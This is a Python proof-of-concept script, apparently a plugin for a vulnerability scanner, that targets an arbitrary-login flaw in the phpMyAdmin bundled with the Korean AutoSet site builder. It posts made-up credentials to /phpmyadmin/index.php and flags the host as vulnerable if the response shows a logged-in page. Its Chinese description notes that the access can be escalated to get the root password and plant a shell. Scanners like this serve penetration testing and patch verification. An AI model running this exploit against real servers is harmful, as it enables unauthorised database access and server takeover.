#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 韩国autoset建站程序phpmyadmin任意登录漏洞
referer: https://www.t00ls.net/viewthread.php?tid=37863&extra=&page=1
author: Ascotbe
reference: Lucifer

description: /phpmyadmin任意用户名密码登录,通过低权限提权可获取root密码插入shell。
'''
import urllib
import requests

def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port
post_data = {
	"pma_username":"test",
	"pma_password":"123",
	"server":"1",
	"target":"index.php",
}
payload = "/phpmyadmin/index.php"
def medusa(Url,RandomAgent,ProxyIp):

    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    global   resp
    payload_url = scheme+"://"+url+payload
    headers = {
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'User-Agent': RandomAgent,
    }
    try:
        #s = requests.session()
        if ProxyIp!=None:
            proxies = {
                # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
                "http": "http://" + str(ProxyIp)
            }
            resp = requests.post(payload_url, data=post_data, headers=headers, proxies=proxies, timeout=5, verify=False)
        elif ProxyIp==None:
            resp = requests.post(payload_url, data=post_data,headers=headers, timeout=5, verify=False)
        con = resp.text
        code = resp.status_code
        if con.lower().find('li_server_type')!=-1:
            Medusa = "{} 存在韩国autoset建站程序phpmyadmin任意登录漏洞\r\n漏洞详情:\r\nPayload:{}\r\nPost:{}\r\n".format(url, payload_url,post_data)
            return (Medusa)
    except Exception as e:
        pass